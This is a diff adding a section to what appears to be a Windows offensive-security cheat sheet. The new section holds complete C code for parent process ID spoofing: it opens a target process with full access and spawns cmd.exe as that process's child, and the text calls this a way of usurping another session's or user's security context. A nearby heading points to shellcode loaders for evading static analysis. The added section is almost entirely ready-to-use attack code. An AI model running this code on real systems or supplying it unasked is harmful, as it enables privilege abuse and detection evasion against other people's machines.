@@ -247,6 +247,116 @@ int _tmain(int argc, TCHAR** argv) {
 }
 ```
 
+### Create process with parent spoofing
+
+The following `C` code can be used to spawn a process as the child of another
+specified process (allowing for cross sessions or user security context
+usurpation):
+
+```c
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <wincrypt.h>
+#include <psapi.h>
+#include <tchar.h>
+#include <tlhelp32.h>
+#include "Source.h"
+#pragma comment (lib, "crypt32.lib")
+#pragma comment (lib, "advapi32")
+#pragma comment (lib, "kernel32")
+
+int main(int argc, char** argv) {
+
+    HANDLE hProc = NULL;
+    STARTUPINFOEX si;
+    PROCESS_INFORMATION pi;
+    int pid = 0;
+    SIZE_T szAttributeList = 0;
+    BOOL ret;
+
+    ZeroMemory(&si, sizeof(STARTUPINFOEX));
+
+    Sleep(2000);
+
+    if (argc != 2) {
+        printf("Usage: SpawnChildProcess.exe <PID>\n");
+        return -1;
+    }
+
+    DWORD tPid = atoi(argv[1]);
+
+    hProc = OpenProcess(PROCESS_ALL_ACCESS, false, tPid);
+    if (!hProc) {
+        printf("[!][OpenProcess] Error opening target process: [%d]\n", GetLastError());
+        return -1;
+    }
+    else {
+        printf("[*][OpenProcess] Handle to target process opened.\n");
+    }
+
+    // First call to InitializeProcThreadAttributeList to retrieve the AttributeList size.
+    InitializeProcThreadAttributeList(NULL, 1, 0, &szAttributeList);
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        printf("[!][InitializeProcThreadAttributeList] First call to InitializeProcThreadAttributeList failed: [%d]\n", GetLastError());
+        CloseHandle(hProc);
+        return -1;
+    }
+    else {
+        printf("[*][InitializeProcThreadAttributeList] Attribute list size retrieved.\n");
+    }
+
+    // Alloc lpAttributeList.
+    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, szAttributeList);
+    if (si.lpAttributeList == NULL) {
+        printf("[!][HeapAlloc] Failed to heap alloc for si.lpAttributeList: [%d]\n", GetLastError());
+        CloseHandle(hProc);
+        return -1;
+    }
+
+    // Init ProcThread AttributeList with the correctly sized szAttributeList.
+    ret = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &szAttributeList);
+    if (!ret) {
+        printf("[!][InitializeProcThreadAttributeList] Second call to InitializeProcThreadAttributeList failed: [%d]\n", GetLastError());
+        CloseHandle(hProc);
+        return -1;
+    }
+    else {
+        printf("[*][InitializeProcThreadAttributeList] Attribute list init done.\n");
+    }
+
+    // Updates the specified attribute for process.
+    ret = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);
+    if (!ret) {
+        printf("[!][UpdateProcThreadAttribute] Failed to update the ProcThread attribute: [%d]\n", GetLastError());
+        CloseHandle(hProc);
+        return -1;
+    }
+    else {
+        printf("[*][UpdateProcThreadAttribute] Attribute list for process creation updated.\n");
+    }
+
+    si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+    // Spawn the new process
+    ret = CreateProcess(_T("C:\\Windows\\system32\\cmd.exe"), NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFO)(&si), &pi);
+    if (!ret) {
+        printf("[!][CreateProcess] Failed to create process: [%d]\n", GetLastError());
+        CloseHandle(hProc);
+        return -1;
+    }
+    else {
+        printf("[+][CreateProcess] Process created!\n");
+    }
+
+    Sleep(2000);
+
+    return 0;
+}
+```
+
 ### Shellcode loader for static analysis evasion
 
 ###### [Windows] Shellter
